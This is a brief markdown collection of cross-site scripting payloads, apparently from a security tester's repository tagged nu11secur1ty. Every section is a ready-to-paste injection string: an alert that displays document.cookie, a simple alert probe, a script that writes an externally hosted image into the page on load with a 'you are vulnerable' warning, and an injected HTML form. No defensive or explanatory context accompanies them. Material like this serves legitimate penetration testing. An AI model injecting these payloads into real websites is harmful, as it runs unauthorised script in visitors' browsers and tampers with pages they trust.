## Get cookie
```
nu11secur1ty<script>alert(document.cookie)</script>
```
## Alert check
```
<script>alert("nu11secur1ty_is_here");</script>
```

## Hidden Image
```
<script>function a() { document.write("<img src='https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp'></img>"); }; window.onload = a; alert("A Hidden scripted image, warning you are vulnerable!");</script>
```
## Post image
```
<form action="#" method="post"><label for="imgURL">image URL:</label><input type="url" id="imgURL"/><label for="pageURL">page URL:</label><input type="url" id="pageURL"/><button id="imgAdd">add image</button></form>
```
